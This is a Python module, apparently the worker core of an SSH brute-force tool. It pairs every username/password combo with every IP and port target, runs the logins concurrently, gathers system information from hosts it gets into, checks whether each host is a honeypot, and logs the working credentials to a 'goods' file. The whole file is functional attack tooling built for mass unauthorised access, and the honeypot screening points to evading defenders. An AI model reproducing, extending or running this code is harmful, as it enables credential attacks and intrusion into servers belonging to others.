# -*- coding: utf-8 -*-
# core/worker.py

import time
import queue
import threading
import concurrent.futures
import signal
from pathlib import Path
from typing import Iterable, List, Tuple, Union


from ui.banner import BannerStats
from ui.decorators import MsgDCR
from ui.table import Table
from core.config import (
    Config,
    FILE_PATH,
    _start_time_monotonic,
    _stop_event,
    _success_ip_port,
    _success_map_lock
)
from core.stats import Stats, _stats_lock
from core.recon import ReconSystem
from core.honeypot import HoneypotEngine
from core.ssh_client import SSH
from core.models import ServerInfo, HoneypotDetector, SSHTask
from core.result_logger import ResultLogger
from utils.file_manager import FileManager


class Worker:
    def __init__(
            self, 
            combos: List[Tuple[str, str]], 
            targets: List[Tuple[str, str]],
            total_tasks: int,
            timeout: int, 
            max_workers: int,
            per_worker: int,
            log_file: str = FILE_PATH.DEBUG_FILE,
            goods_file: str = FILE_PATH.GOODS_FILE,
            goods_detailed_file: str = FILE_PATH.DETAILED_FILE,
            honeypot_file: str = FILE_PATH.HONEYPOT_FILE
        ) -> None:

        self.combos = combos
        self.targets = targets
        self.total_tasks = total_tasks
        self.timeout = timeout
        self.max_workers = max_workers
        self.per_worker = per_worker
        self.log_file = log_file
        self.goods_file = goods_file
        self.goods_detailed_file = goods_detailed_file
        self.honeypot_file = honeypot_file
        self.file_manager = FileManager()
        self.recon = ReconSystem()
        self.logger = ResultLogger()
        self.honeypot_engine = HoneypotEngine()
        self.task_q = queue.Queue(
            max(1, self.calculate_optimal_buffer()))

    def _process_wrapper(self, task: SSHTask, semaphore: threading.Semaphore) -> None:
        try:
            self.process_task(task)
        finally:
            semaphore.release()
    

    def run(self) -> None:
        global _start_time_monotonic
        if not self.total_tasks:
            try:
                self.total_tasks = len(self.combos) * len(self.targets)
            except Exception:
                self.total_tasks = 0

        if self.total_tasks == 0:
            MsgDCR.FailureMessage("No tasks to run. Check your files.")
            return
        
        _start_time_monotonic = time.perf_counter()

        banner_task = BannerStats(self.total_tasks)
        banner_thread = threading.Thread(target=banner_task.run, daemon=True)
        banner_thread.start()

        if _stop_event.is_set():
            MsgDCR.FailureMessage("Execution stopped before start.")
            return

        # Producer fills queue with SSHTask instances
        prod_thread = threading.Thread(target=self.producer, daemon=True)
        prod_thread.start()

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            worker_futures = [pool.submit(self.worker_main, i)
                               for i in range(self.max_workers)]
            prod_thread.join()
            concurrent.futures.wait(worker_futures, timeout=None)
        

        # Signal banner to stop and give it a moment to exit
        _stop_event.set()
        banner_thread.join(timeout=1.0)

    def producer(self) -> None:
        try:
            for task in self.generate_tasks(self.combos, self.targets):
                if _stop_event.is_set():
                    break
                self.task_q.put(task)
        finally:
            # Send sentinel Nones to let workers finish
            for _ in range(self.max_workers):
                self.task_q.put(None)
    

    def worker_main(self, worker_id: int) -> None:
        semaphore = threading.BoundedSemaphore(
            self.per_worker)
        futures: List[concurrent.futures.Future[None]] = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.per_worker) as inner_pool:
            while True:
                if _stop_event.is_set():
                    for f in futures:
                        f.cancel()
                    break
                try:
                    task = self.task_q.get(timeout=0.2)
                except queue.Empty:
                    continue
                if task is None:
                    break
                semaphore.acquire()
                fut = inner_pool.submit(
                    self._process_wrapper, task, semaphore)
                futures.append(fut)
        # Ensure all inner futures complete
        concurrent.futures.wait(futures, timeout=None)
    
    def calculate_optimal_buffer(self) -> int:
        # Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (safety factor)
        return int(self.max_workers * self.per_worker * 1.5)

    def generate_tasks(self, combos: Iterable[Tuple[str, str]], targets: Iterable[Tuple[str, str]]) -> Iterable[SSHTask]:
        for u, p in combos:
            for ip, port in targets:
                yield SSHTask(ip=ip, port=port, username=u, password=p)
    
    def process_task(self, task: SSHTask) -> None:
        """Process a single SSH task with safe logging and stats updates."""
        t0 = time.perf_counter()

        try:
            ssh = SSH(
                hostname=task.ip,
                port=int(task.port), 
                username=task.username, 
                password=task.password, 
                timeout=self.timeout
            )

            ssh.connect_safe()

            server = ServerInfo(
                ip=task.ip,
                port=task.port,
                username=task.username,
                password=task.password,
            )

            server.response_time_ms = (time.perf_counter() - t0) * 1000.0

            self.recon.gather_system_info(ssh, server)
            detector = HoneypotDetector()
            server.is_honeypot = self.honeypot_engine.detect(ssh, server, detector)

            if not server.is_honeypot:
                with _stats_lock:
                    Stats.Goods.increment()
                    self.logger.log_debug_file(f"[SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n")
                self.logger.log_success(server)
            else:
                with _stats_lock:
                    Stats.Honeypots.increment()
                self.file_manager.file_append(
                    self.log_file,
                    f"[HONEYPOT SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n",
                )
                self.logger.log_honeypot(server)
        except RuntimeError:
            with _stats_lock:
                Stats.Errors.increment()
        except Exception as ex:
            with _stats_lock:
                Stats.Errors.increment()
            self.logger.log_debug_file(f"[NOT CONNECTED] {task.ip}:{task.port}@{task.username}:{task.password}\n",)